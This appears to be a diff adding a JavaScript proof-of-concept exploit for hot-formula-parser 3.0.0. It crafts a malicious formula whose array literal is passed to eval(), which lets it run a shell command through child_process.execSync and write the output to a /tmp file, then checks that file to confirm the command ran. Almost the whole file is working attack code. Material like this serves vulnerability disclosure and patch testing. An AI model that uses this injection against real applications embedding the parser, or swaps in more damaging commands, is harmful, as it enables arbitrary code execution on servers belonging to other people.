@@ -1,0 +1,33 @@
+```javascript
+// Exploit for hot-formula-parser (3.0.0): Arbitrary code execution via eval()
+// on ARRAY-literal formula syntax (grammar-parser.js -> `eval('[' + yytext + ']')`).
+// A formula string is treated as trusted input by the grammar/lexer, but the
+// content between `[` and `]` is passed straight into a native `eval()` call
+// with no sanitization, so any attacker-controlled formula becomes arbitrary
+// JavaScript execution in the host process.
+
+const { Parser } = require("hot-formula-parser");
+
+const parser = new Parser();
+// A normal consumer just wires up function calls like SUM/AVERAGE, etc.
+parser.on("callFunction", (name, params, done) => done(params));
+
+// Malicious "formula" a user could submit to any app embedding this parser
+// (spreadsheet, form calculator, etc). The `[...]` is lexed as an ARRAY
+// token and its raw text is eval()'d verbatim.
+const maliciousFormula =
+  'SUM([1,(function(){' +
+  'require("child_process").execSync("id > /tmp/hot-formula-pwned.txt");' +
+  'return 2;})()])';
+
+const result = parser.parse(maliciousFormula);
+console.log("Parser result:", result);
+
+const fs = require("fs");
+if (fs.existsSync("/tmp/hot-formula-pwned.txt")) {
+  console.log("EXPLOIT SUCCESS - command executed, output:");
+  console.log(fs.readFileSync("/tmp/hot-formula-pwned.txt", "utf8"));
+} else {
+  console.log("Exploit did not trigger.");
+}
+```
